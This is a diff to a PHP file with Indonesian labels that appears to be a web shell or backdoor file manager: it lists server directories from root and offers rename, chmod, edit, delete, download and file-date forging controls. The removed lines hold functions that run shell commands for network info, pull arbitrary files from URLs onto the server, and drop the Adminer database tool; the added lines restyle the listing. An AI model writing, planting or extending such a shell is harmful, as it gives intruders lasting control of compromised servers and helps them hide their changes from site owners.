@@ -80,66 +80,6 @@ if (!isset($_SESSION['authenticated']) || !$_SESSION['authenticated']) {
     exit;
 }
 
-// Fungsi untuk menampilkan informasi sistem
-function displaySystemInfo() {
-    $info = [
-        'System' => php_uname(),
-        'PHP Version' => phpversion(),
-        'Server IP' => $_SERVER['SERVER_ADDR'],
-        'Client IP' => $_SERVER['REMOTE_ADDR'],
-        'Document Root' => $_SERVER['DOCUMENT_ROOT'],
-        'Server Software' => $_SERVER['SERVER_SOFTWARE'],
-    ];
-
-    foreach ($info as $key => $value) {
-        echo "<p><strong>$key:</strong> $value</p>";
-    }
-}
-
-// Fungsi untuk menampilkan informasi jaringan
-function displayNetworkInfo() {
-    $output = shell_exec('ifconfig');
-    echo "<pre>$output</pre>";
-}
-
-// Fungsi untuk mengubah tanggal modifikasi file
-function changeFileDate($path, $newDate) {
-    $timestamp = strtotime($newDate);
-    if (touch($path, $timestamp)) {
-        echo "<div class='alert alert-success'>Tanggal berhasil diubah.</div>";
-    } else {
-        echo "<div class='alert alert-danger'>Gagal mengubah tanggal.</div>";
-    }
-}
-
-// Fungsi upload file dari URL
-function uploadFromUrl($url, $saveTo) {
-    $fileContent = file_get_contents($url);
-    if ($fileContent === FALSE) {
-        die('Gagal mengunduh file dari URL');
-    }
-    file_put_contents($saveTo, $fileContent);
-    playAudio();
-    echo "<div class='alert alert-success'>File berhasil diupload: $saveTo</div>";
-}
-
-// Fungsi upload Adminer
-function uploadAdminer($saveTo) {
-    $adminerUrl = 'https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1-en.php';
-    uploadFromUrl($adminerUrl, $saveTo);
-}
-
-// Fungsi upload file dari form
-function uploadFromForm($file, $saveTo) {
-    if (move_uploaded_file($file['tmp_name'], $saveTo)) {
-        playAudio();
-        echo "<div class='alert alert-success'>File berhasil diupload: $saveTo</div>";
-    } else {
-        echo "<div class='alert alert-danger'>Gagal mengupload file.</div>";
-    }
-}
-
-// Fungsi untuk menampilkan direktori dan file
 function display_path_links($dir) {
     if (is_dir($dir)) {
         $folders = [];
@@ -161,14 +101,14 @@ function display_path_links($dir) {
             $encodedPath = urlencode(base64_encode($folderPath));
             $isRoot = $folderPath === '/';
             $style = $isRoot ? "style='color:red;'" : "";
-            echo "<div class='list-group-item d-flex justify-content-between align-items-center' $style>";
-            echo "<span class='col-4'>$folder/</span>";
-            echo "<span class='col-4 text-center'>" . get_permissions($folderPath) . "</span>";
-            echo "<span class='col-4 text-right'>" . date("Y-m-d H:i:s", filemtime($folderPath)) . "</span>";
-            echo "<button class='btn btn-warning btn-sm ml-2' onclick=\"showForm('rename-$folder')\">Ganti Nama</button>";
-            echo "<button class='btn btn-secondary btn-sm ml-2' onclick=\"showForm('chmod-$folder')\">Ubah Chmod</button>";
-            echo "<button class='btn btn-info btn-sm ml-2' onclick=\"showForm('date-$folder')\">Ubah Tanggal</button>";
-            echo "<button class='btn btn-danger btn-sm ml-2' onclick=\"showForm('delete-$folder')\">Hapus</button>";
+            echo "<div class='list-group-item' $style>";
+            echo "<span class='folder-item'>$folder/</span>";
+            echo "<span class='folder-permissions'>" . get_permissions($folderPath) . "</span>";
+            echo "<span class='folder-date'>" . date("Y-m-d H:i:s", filemtime($folderPath)) . "</span>";
+            echo "<button class='btn btn-warning btn-sm' onclick=\"showForm('rename-$folder')\">Ganti Nama</button>";
+            echo "<button class='btn btn-secondary btn-sm' onclick=\"showForm('chmod-$folder')\">Ubah Chmod</button>";
+            echo "<button class='btn btn-info btn-sm' onclick=\"showForm('date-$folder')\">Ubah Tanggal</button>";
+            echo "<button class='btn btn-danger btn-sm' onclick=\"showForm('delete-$folder')\">Hapus</button>";
             echo "</div>";
 
             // Form Rename
@@ -233,16 +173,16 @@ function display_path_links($dir) {
             $encodedPath = urlencode(base64_encode($filePath));
             $isRoot = $filePath === '/';
             $style = $isRoot ? "style='color:red;'" : "";
-            echo "<div class='list-group-item d-flex justify-content-between align-items-center' $style>";
-            echo "<span class='col-4'>$file</span>";
-            echo "<span class='col-4 text-center'>" . get_permissions($filePath) . "</span>";
-            echo "<span class='col-4 text-right'>" . date("Y-m-d H:i:s", filemtime($filePath)) . "</span>";
-            echo "<button class='btn btn-warning btn-sm ml-2' onclick=\"showForm('rename-$file')\">Ganti Nama</button>";
-            echo "<button class='btn btn-secondary btn-sm ml-2' onclick=\"showForm('chmod-$file')\">Ubah Chmod</button>";
-            echo "<button class='btn btn-info btn-sm ml-2' onclick=\"showForm('date-$file')\">Ubah Tanggal</button>";
-            echo "<button class='btn btn-primary btn-sm ml-2' onclick=\"showForm('edit-$file')\">Edit</button>";
-            echo "<button class='btn btn-danger btn-sm ml-2' onclick=\"showForm('delete-$file')\">Hapus</button>";
-            echo "<a href='?download=$encodedPath' class='btn btn-info btn-sm ml-2'>Download</a>";
+            echo "<div class='list-group-item' $style>";
+            echo "<span class='folder-item'>$file</span>";
+            echo "<span class='folder-permissions'>" . get_permissions($filePath) . "</span>";
+            echo "<span class='folder-date'>" . date("Y-m-d H:i:s", filemtime($filePath)) . "</span>";
+            echo "<button class='btn btn-warning btn-sm' onclick=\"showForm('rename-$file')\">Ganti Nama</button>";
+            echo "<button class='btn btn-secondary btn-sm' onclick=\"showForm('chmod-$file')\">Ubah Chmod</button>";
+            echo "<button class='btn btn-info btn-sm' onclick=\"showForm('date-$file')\">Ubah Tanggal</button>";
+            echo "<button class='btn btn-primary btn-sm' onclick=\"showForm('edit-$file')\">Edit</button>";
+            echo "<button class='btn btn-danger btn-sm' onclick=\"showForm('delete-$file')\">Hapus</button>";
+            echo "<a href='?download=$encodedPath' class='btn btn-info btn-sm'>Download</a>";
             echo "</div>";
 
             // Form Rename
@@ -562,6 +502,23 @@ $dirArray = array_filter(explode(DIRECTORY_SEPARATOR, $displayDir), function($va
 
         .form-container .btn:hover, .open-button:hover {
             opacity: 1;
+        }
+
+        .list-group-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid #ddd;
+            padding: 10px 0;
+        }
+
+        .folder-item {
+            flex: 2;
+        }
+
+        .folder-permissions, .folder-date {
+            flex: 1;
+            text-align: center;
         }
         
         .info-sites, .network-info {
